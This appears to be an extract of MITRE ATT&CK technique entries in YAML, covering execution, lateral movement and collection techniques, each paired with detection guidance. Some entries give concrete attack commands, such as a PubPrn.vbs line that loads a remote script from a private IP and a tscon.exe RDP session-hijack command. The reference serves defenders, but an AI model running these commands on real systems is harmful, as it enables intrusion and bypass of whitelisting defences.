        with AppleScript for local or remote IPC. Osascript executes AppleScript and
        any other Open Scripting Architecture (OSA) language scripts. A list of OSA
        languages installed on a system can be found by using the <code>osalang</code>
        program.\nAppleEvent messages can be sent independently or as part of a script.
        These events can locate open windows, send keystrokes, and interact with almost
        any open application locally or remotely. \n\nAdversaries can use this to
        interact with open SSH connection, move to remote machines, and even present
        users with fake dialog boxes. These events cannot start applications remotely
        (they can start them locally though), but can interact with applications if
        they're already running remotely. Since this is a scripting language, it can
        be used to launch more common techniques as well such as a reverse shell via
        python  (Citation: Macro Malware Targets Macs). Scripts can be run from the
        command lie via <code>osascript /path/to/script</code> or <code>osascript
        -e \"script here\"</code>.\n\nDetection: Monitor for execution of AppleScript

        The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

        Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

        CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List)

        Detection: Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.

      description: |-
        Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).

        Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

        Detection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.

      description: |-
        An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.

        Detection: Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.

        Anti-virus can potentially detect malicious documents and files that are downloaded and execuited on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.

      name: Dynamic Data Exchange
      description: |-
        Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

        Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

        Detection: OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution. (Citation: NVisio Labs DDE Detection Oct 2017)

        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

        Detection: Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

      name: Local Job Scheduling
      description: |-
        On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ===cron===

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on Mac and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ===at===

        The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ===launchd===

        Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

        Detection: Legitimate scheduled jobs may be created during installation of new software or through administration functions. Jobs scheduled with launchd and cron can be monitored from their respective utilities to list out detailed information about the jobs. Monitor process execution resulting from launchd and cron tasks to look for unusual or unknown applications and behavior.

      name: PowerShell
      description: "PowerShell is a powerful interactive command-line interface and
        scripting environment included in the Windows operating system. (Citation:
        TechNet PowerShell) Adversaries can use PowerShell to perform a number of
        actions, including discovery of information and execution of code. Examples
        include the Start-Process cmdlet which can be used to run an executable and
        the Invoke-Command cmdlet which runs a command locally or on a remote computer.
        \n\nPowerShell may also be used to download and run executables from the Internet,
        which can be executed from disk or in memory without touching disk.\n\nAdministrator
        permissions are required to use PowerShell to connect to remote systems.\n\nA
        number of PowerShell-based offensive testing tools are available, including
        Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit)
        and PSAttack. (Citation: Github PSAttack)\n\nDetection: If proper execution
        policy is set, adversaries will likely be able to define their own execution
        policy if they obtain administrator or system access, either through the Registry
        or at the command line. This change in policy on a system may be a way to
        detect malicious use of PowerShell. If PowerShell is not used in an environment,
        then simply looking for PowerShell execution may detect malicious activity.\n\nIt
        is also beneficial to turn on PowerShell logging to gain increased fidelity
        in what occurs during execution. (Citation: Malware Archaeology PowerShell
        Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and
        some of those features have since been added to PowerShell 4.0. Earlier versions
        of PowerShell do not have many logging features. (Citation: FireEye PowerShell
        Logging 2016) An organization can gather PowerShell execution details in a
        data analytic platform to supplement it with other data.\n\nPlatforms: Windows\n\nData
        Sources: Windows Registry, File monitoring, Process command-line parameters,
        Process monitoring\n\nPermissions Required: User, Administrator\n\nRemote
        Support: Yes"

      description: |-
        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

        Detection: Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking. (Citation: Carbon Black Squiblydoo Apr 2016)

        Detection: Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

    technique:
      name: Scheduled Task
      description: |-
        Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Detection: Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        *Event ID 106 - Scheduled task registered
        *Event ID 140 - Scheduled task updated
        *Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

      name: Scripting
      description: |-
        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macos being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike.  (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Detection: Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as word.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

        Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.

        Detection: Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool PsExec.

        PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>

        There are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)

        The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.

        Detection: Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.

      name: Trusted Developer Utilities
      description: "There are many utilities used for software development related
        tasks that can be used to execute code in various forms to assist in development,
        debugging, and reverse engineering. These utilities may often be signed with
        legitimate certificates that allow them to execute on a system and proxy execution
        of malicious code through a trusted process that effectively bypasses application
        whitelisting defensive solutions.\n\n===MSBuild===\n\nMSBuild.exe (Microsoft
        Build Engine) is a software build platform used by Visual Studio. It takes
        XML formatted project files that define requirements for building various
        platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can
        use MSBuild to proxy execution of code through a trusted Windows utility.
        The inline task capability of MSBuild that was introduced in .NET version
        4 allows for C# code to be inserted into the XML project file. (Citation:
        MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task.
        MSBuild.exe is a signed Microsoft binary, so when it is used this way it can
        execute arbitrary code and bypass application whitelisting defenses that are
        configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The
        Things Application Whitelisting Bypass)\n\n===DNX===\n\nThe .NET Execution
        Environment (DNX), dnx.exe, is a software development kit packaged with Visual
        Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation:
        Microsoft Migrating from DNX) DNX is not present on standard builds of Windows
        and may only be present on developer workstations using older versions of
        .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft.
        \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass
        application whitelist policies that do not account for DNX. (Citation: engima0x3
        DNX Bypass)\n\n===RCSI===\n\nThe rcsi.exe utility is a non-interactive command-line
        interface for C# that is similar to csi.exe. It was provided within an early
        version of the Roslyn .NET Compiler Platform but has since been deprecated
        for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe
        binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx
        script files can be written and executed with rcsi.exe at the command-line.
        An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass
        application whitelisting policies that do not account for execution of rcsi.exe.
        (Citation: engima0x3 RCSI Bypass)\n\n===WinDbg/CDB===\n\nWinDbg is a Microsoft
        Windows kernel and user-mode debugging utility. The Microsoft Console Debugger
        (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows
        software development kits and can be used as standalone tools. (Citation:
        Microsoft Debugging Tools for Windows) They are commonly used in software
        development and reverse engineering and may not be found on typical Windows
        systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn
        adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code
        to bypass application whitelist policies that do not account for execution
        of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible
        to use other debuggers for similar purposes, such as the kernel-mode debugger
        kd.exe, which is also signed by Microsoft.\n\n===Tracker===\n\nThe file tracker
        utility, tracker.exe, is included with the .NET framework as part of MSBuild.
        It is used for logging calls to the Windows file system. (Citation: Microsoft
        Docs File Tracking)\n\nAn adversary can use tracker.exe to proxy execution
        of an arbitrary DLL into another process. Since tracker.exe is also signed
        it can be used to bypass application whitelisting solutions. (Citation: Twitter
        SubTee Tracker.exe)\n\nDetection: The presence of these or other utilities
        that enable proxy execution that are typically used for development, debugging,
        and reverse engineering on a system that is not used for these purposes may
        be suspicious.\n\nUse process monitoring to monitor the execution and arguments
        of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare
        recent invocations of those binaries with prior history of known good arguments
        and executed binaries to determine anomalous and potentially adversarial activity.
        It is likely that these utilities will be used by software developers or for
        other software development related tasks, so if it exists and is used outside
        of that context, then the event may be suspicious. Command arguments used
        before and after invocation of the utilities may also be useful in determining
        the origin and purpose of the binary being executed.\n\nPlatforms: Windows\n\nData

      description: |-
        Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

        An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)

        Detection: Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of "wmic" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)

      description: "macOS and OS X applications send AppleEvent messages to each other
        for interprocess communications (IPC). These messages can be easily scripted
        with AppleScript for local or remote IPC. Osascript executes AppleScript and
        any other Open Scripting Architecture (OSA) language scripts. A list of OSA
        languages installed on a system can be found by using the <code>osalang</code>
        program.\nAppleEvent messages can be sent independently or as part of a script.
        These events can locate open windows, send keystrokes, and interact with almost
        any open application locally or remotely. \n\nAdversaries can use this to
        interact with open SSH connection, move to remote machines, and even present
        users with fake dialog boxes. These events cannot start applications remotely
        (they can start them locally though), but can interact with applications if
        they're already running remotely. Since this is a scripting language, it can
        be used to launch more common techniques as well such as a reverse shell via
        python  (Citation: Macro Malware Targets Macs). Scripts can be run from the
        command lie via <code>osascript /path/to/script</code> or <code>osascript

      description: "Third-party applications and software deployment systems may be
        in use in the network environment for administration purposes (e.g., SCCM,
        VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems,
        then they may be able to execute code.\n\nAdversaries may gain access to and
        use third-party application deployment systems installed within an enterprise
        network. Access to a network-wide or enterprise-wide software deployment system
        enables an adversary to have remote code execution on all systems that are
        connected to such a system. The access may be used to laterally move to systems,
        gather information, or cause a specific effect, such as wiping the hard drives
        on all endpoints.\n\nThe permissions required for this action vary by system
        configuration; local credentials may be sufficient with direct access to the
        deployment server, or specific domain credentials may be required. However,
        the system may require an administrative account to log in or to perform software
        deployment.\n\nDetection: Detection methods will vary depending on the type
        of third-party software or system and how it is typically used. \n\nThe same
        investigation process can be applied here as with other potentially malicious
        activities where the distribution vector is initially unknown but the resulting
        activity follows a discernible pattern. Analyze the process execution trees,
        historical activities from the third-party application (such as what types
        of files are usually pushed), and the resulting activities or events from
        the file/binary/script pushed to systems. \n\nOften these third-party applications
        will have logs of their own that can be collected and correlated with other
        data from the environment. Audit software deployment logs and look for suspicious
        or unauthorized activity. A system not typically used to push software to
        clients that suddenly is used for such a task outside of a known admin function
        may be suspicious.\n\nPerform application deployment at regular times so that
        irregular deployment activity stands out. Monitor process activity that does
        not correlate to known good software. Monitor account login activity on the

    technique:
      name: Logon Scripts
      description: |-
        ===Windows===

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ===Mac===

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

        Detection: Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.

        Platforms: macOS, Windows

        Data Sources: File monitoring, Process monitoring

        System Requirements: Write access to system or domain logon scripts

      name: Remote Desktop Protocol
      description: |-
        Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS.

        Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence.

        Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)

        Detection: Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        Also, set up process monitoring for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to prevent RDP session hijacking.

      description: |-
        Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

        Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with Windows Admin Shares or Remote Desktop Protocol.

        Detection: Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

        Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)

      name: Audio Capture
      description: |-
        An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.

        Detection: Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

        Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.

      description: "Once established within a system or network, an adversary may
        use automated techniques for collecting internal data. Methods for performing
        this technique could include use of Scripting to search for and copy information
        fitting set criteria such as file type, location, or name at specific time
        intervals. This functionality could also be built into remote access tools.
        \n\nThis technique may incorporate use of other techniques such as File and
        Directory Discovery and Remote File Copy to identify and move files.\n\nDetection:
        Depending on the method used, actions could include common file system commands
        and parameters on the command-line interface within batch files or scripts.
        A sequence of actions like this may be unusual, depending on the system and
        network environment. Automated collection may occur along with other techniques
        such as Data Staged. As such, file access monitoring that shows an unusual
        process performing sequential file opens and potentially copy actions to another
        location on the file system for many files at once may indicate automated
        collection behavior. Remote access tools with built-in features may interact

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images.

      description: |-
        Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when Credential Dumping efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)

        Detection: Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

        Monitor the Registry for the addition of a Custom Credential Provider. (Citation: Wrightson 2012) Detection of compromised Valid Accounts in use by adversaries may help to catch the result of user input interception if new techniques are used.

      description: |-
        Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

        ===Mac===

        On OSX, the native command <code>screencapture</code> is used to capture screenshots.

        ===Linux===

        On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)

        Detection: Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.

      name: Data Compressed
      description: |-
        An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.

        Detection: Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.

        If the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)

